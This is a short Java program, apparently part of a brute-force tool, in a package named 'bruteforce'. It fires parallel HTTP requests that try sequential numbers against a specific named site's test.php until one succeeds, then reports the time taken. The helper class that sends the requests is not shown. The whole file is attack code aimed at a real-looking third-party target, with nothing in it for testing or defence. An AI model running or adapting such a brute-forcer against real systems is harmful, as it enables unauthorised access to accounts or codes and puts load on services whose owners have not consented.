package bruteforce;

import java.io.IOException;
import java.util.stream.Stream;

public class Main {
    public static void main(String[] args) throws IOException {
        // setting new ForkJoinPool size
        System.setProperty("java.util.concurrent.ForkJoinPool.common.parallelism", "20");

        RequestsSender sender = new RequestsSender("http://www.rollshop.co.il/test.php");

        long start = System.nanoTime();
        Stream.iterate(0L, x -> ++x)
                .parallel()
                .filter(sender::send)
                .findAny();
        long end = System.nanoTime();

        System.out.println("Time took: " + (end - start) / 1000000.0 + " ms.");
    }
}
